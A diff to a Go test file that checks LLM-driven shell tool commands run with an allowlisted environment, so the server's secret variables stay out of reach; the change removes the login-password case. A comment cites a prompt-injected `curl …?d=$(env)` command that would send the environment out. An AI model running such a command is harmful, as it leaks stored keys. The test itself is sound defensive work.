@@ -195,13 +195,12 @@ func TestExecuteTool_Bash_DirectTimeout(t *testing.T) {
 
 // Security: host-mode tool commands are LLM-driven, so they get the allowlisted
 // environment — the server's MIKE_* secrets must never reach them, where a prompt-injected
-// `curl …?d=$(env)` would exfiltrate the master password and the stored provider keys.
+// `curl …?d=$(env)` would exfiltrate the key that decrypts the stored provider keys.
 func TestExecCommandStream_EnvIsAllowlisted(t *testing.T) {
-	t.Setenv("MIKE_LOGIN_PASSWORD", "s3cret-master-password")
 	t.Setenv("MIKE_ENCRYPTION_KEY", "s3cret-encryption-key")
 
 	out, err := execCommandStream(context.Background(), t.TempDir(),
-		"echo pw=[${MIKE_LOGIN_PASSWORD}] key=[${MIKE_ENCRYPTION_KEY}] path=[${#PATH}] prompt=[${GIT_TERMINAL_PROMPT}]",
+		"echo key=[${MIKE_ENCRYPTION_KEY}] path=[${#PATH}] prompt=[${GIT_TERMINAL_PROMPT}]",
 		10, nil)
 	if err != nil {
 		t.Fatalf("execCommandStream: %v (%s)", err, out)
